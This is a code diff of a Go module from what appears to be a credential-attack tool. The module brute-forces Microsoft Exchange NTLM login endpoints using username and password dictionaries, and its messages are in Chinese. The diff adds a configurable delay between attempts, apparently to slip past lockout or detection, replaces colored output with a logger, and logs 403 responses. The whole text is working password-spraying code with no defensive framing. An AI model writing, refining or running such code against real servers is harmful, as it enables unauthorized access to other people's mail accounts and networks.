@@ -1,34 +1,36 @@
 package lib
 
 import (
-	"fmt"
-	"github.com/fatih/color"
 	"net/http"
 	"net/url"
 	"sync"
 	"time"
 )
 
-func NtlmBruteWorker(u string, domain string, task chan []string) {
+func NtlmBruteWorker(u string, domain string, task chan []string, delay int) {
 
 	for data := range task {
 		username, password := data[0], data[1]
+		Log.Debug("[*] 尝试: %v:%v", username, password)
 		req, _ := http.NewRequest("GET", u, nil)
 		req.SetBasicAuth(domain+"\\"+username, password)
 		res, _ := NtlmClient.Do(req)
-		if res.StatusCode != 401 && res.StatusCode != 408 && res.StatusCode != 504 {
-			color.Green("[+] 成功: %v", username+":"+password)
+		if res.StatusCode == 403 {
+			Log.Failed("[*] 403 错误")
+		} else if res.StatusCode != 401 && res.StatusCode != 408 && res.StatusCode != 504 {
+			Log.Success("[+] 成功: %v", username+":"+password)
 		} else {
-			//color.Red("[-] 失败: %v", username+":"+password)
+			Log.Failed("[-] 失败: %v", username+":"+password)
 		}
+		time.Sleep(time.Second * time.Duration(delay))
 	}
 }
 
-func NtlmBruteRun(targetUrl string, mode string, domain string, userDict []string, passDict []string, n int) {
+func NtlmBruteRun(targetUrl string, mode string, domain string, userDict []string, passDict []string, n int, delay int) {
 
 	authPath := ExchangeUrls[mode]
 	u, _ := url.JoinPath(targetUrl, authPath)
-	fmt.Println("[*] 使用", mode, "接口爆破:", targetUrl)
+	Log.Info("[*] 使用 %v 接口爆破: %v", mode, targetUrl)
 
 	task := make(chan []string, len(userDict)*len(passDict))
 
@@ -48,12 +50,12 @@ func NtlmBruteRun(targetUrl string, mode string, domain string, userDict []strin
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			NtlmBruteWorker(u, domain, task)
+			NtlmBruteWorker(u, domain, task, delay)
 		}()
 	}
 
 	wg.Wait()
 
 	t2 := time.Now()
-	fmt.Println("[*] 耗时:", t2.Sub(t1))
+	Log.Info("[*] 耗时: %v", t2.Sub(t1))
 }
